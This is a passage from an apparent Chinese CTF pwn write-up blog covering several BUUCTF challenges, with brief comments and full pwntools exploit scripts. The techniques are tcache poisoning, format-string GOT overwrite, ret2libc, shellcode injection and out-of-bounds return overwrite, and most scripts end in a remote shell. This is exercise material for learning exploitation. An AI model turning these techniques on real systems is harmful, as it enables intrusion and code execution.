:p.recvuntil(text)</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">inter   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg = <span class="keyword">lambda</span> s, num: log.success(<span class="string">f&quot;<span class="subst">&#123;s&#125;</span> &gt;&gt;&gt; <span class="subst">&#123;<span class="built_in">hex</span>(num)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29944</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;size&gt;&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index&gt;&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index&gt;&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sl(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit2</span>(<span class="params">idx,content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index&gt;&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    s(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">buf=<span class="number">0x602090</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(buf-<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit2(<span class="number">2</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sla(<span class="string">b&#x27;choice&gt;&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="actf-2019-babyheap"><a href="#actf-2019-babyheap" class="headerlink" title="actf_2019_babyheap"></a>actf_2019_babyheap</h2><p>这题写的气死我了，开始没看到system &#x2F;bin&#x2F;sh\x00全给了，疯狂在想着怎么去泄露libc，因为UAF，想着unsortedbin，结果怎么申请都是tcache_bin 申请多了会直接退出，申请大于0x400会直接失效</p><p>结果网上一看wp，吐了 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rl  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">inter   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg = <span class="keyword">lambda</span> s, num: log.success(<span class="string">f&quot;<span class="subst">&#123;s&#125;</span> &gt;&gt;&gt; <span class="subst">&#123;<span class="built_in">hex</span>(num)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25912</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Please input size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&#x27;Please input content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Please input list index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Please input list index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">sh=<span class="number">0x602010</span></span><br><span class="line">system=elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;cccc&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>,p64(sh)+p64(system))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-Not-Bad-shellcode"><a href="#极客大挑战-2019-Not-Bad-shellcode" class="headerlink" title="[极客大挑战 2019]Not Bad(shellcode)"></a>[极客大挑战 2019]Not Bad(shellcode)</h2><p>开始我还想着怎么空间就是不够，原来要先跳转到开辟的空间上面，在执行shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29051</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">mmap=<span class="number">0x123000</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 3</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push rsp </span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x50</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x50</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shell=asm(</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    sub rsp,0x30</span></span><br><span class="line"><span class="string">    jmp rsp</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">payload1=asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>))+asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax,0x123000</span></span><br><span class="line"><span class="string">call rax</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=payload1.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x90&#x27;</span>)+p64(<span class="number">0x400a01</span>)+shell</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="axb-2019-fmt64-fmtstr-payload"><a href="#axb-2019-fmt64-fmtstr-payload" class="headerlink" title="axb_2019_fmt64(fmtstr_payload)"></a>axb_2019_fmt64(fmtstr_payload)</h2><p>fmtstr_payload这个用法也是第一次学到,,</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn1&#x27;)</span></span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29116</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/home/yfy/tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">printf=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;%83$p\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak_base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x20830</span></span><br><span class="line">log.success(<span class="string">f&#x27;libc&gt;&gt;&gt;<span class="subst">&#123;<span class="built_in">hex</span>(leak_base)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system=leak_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">f&#x27;system&gt;&gt;&gt;<span class="subst">&#123;<span class="built_in">hex</span>(system)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># high_sys = (system &gt;&gt; 16) &amp; 0xff</span></span><br><span class="line"><span class="comment"># low_sys = system &amp; 0xffff</span></span><br><span class="line"><span class="comment"># #payload=fmtstr_payload(8, &#123;printf_plt:system&#125;)</span></span><br><span class="line"><span class="comment"># # payload = b&quot;%&quot; + str(high_sys - 9) + b&quot;c%12$hhn&quot; + b&quot;%&quot; + str(low_sys - high_sys) + b&quot;c%13$hn&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # payload = payload.ljust(32,b&quot;\x90&quot;) + p64(printf + 2) + p64(printf)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">8</span>, &#123;printf:system&#125;, write_size = <span class="string">&#x27;byte&#x27;</span>, numbwritten = <span class="number">0x9</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="wustctf2020-name-your-cat"><a href="#wustctf2020-name-your-cat" class="headerlink" title="wustctf2020_name_your_cat"></a>wustctf2020_name_your_cat</h2><p>数组越界直接把后门写到返回地址处</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">b&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25779</span>)</span><br><span class="line"></span><br><span class="line">shell=<span class="number">0x80485cb</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Name for which?&#x27;</span>,<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Give your name plz:&#x27;</span>,p32(shell))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Name for which?&#x27;</span>,<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Give your name plz:&#x27;</span>,p32(shell))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Name for which?&#x27;</span>,<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Give your name plz:&#x27;</span>,p32(shell))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Name for which?&#x27;</span>,<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Give your name plz:&#x27;</span>,p32(shell))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Name for which?&#x27;</span>,<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Give your name plz:&#x27;</span>,p32(shell))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="cmcc-pwnme1"><a href="#cmcc-pwnme1" class="headerlink" title="cmcc_pwnme1"></a>cmcc_pwnme1</h2><p>后门不能用就是ret2libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">b&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27544</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main=<span class="number">0x80486f4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xA4</span>+<span class="number">4</span>)+p32(puts_plt)+p32(main)+p32(puts_got)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">leak=u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=leak-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">bin_sh_addr=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xa4</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(system_addr)+p32(main)+p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="wdb2018-guess"><a href="#wdb2018-guess" class="headerlink" title="wdb2018_guess"></a>wdb2018_guess</h2><p>循环三次，我开始还以为先利用fork爆破canary再ret2libc结果没搞出，后面才知道可以这样利用</p><p>详细题解看这个</p><p><a href="https://yufeiyu33.github.io/2024/12/02/wdb2018-guess%E9%A2%98%E8%A7%A3/">wdb2018_guess题解 | 鱼非愚 (yufeiyu33.github.io)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27624</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rl  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">inter   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg = <span class="keyword">lambda</span> s, num: 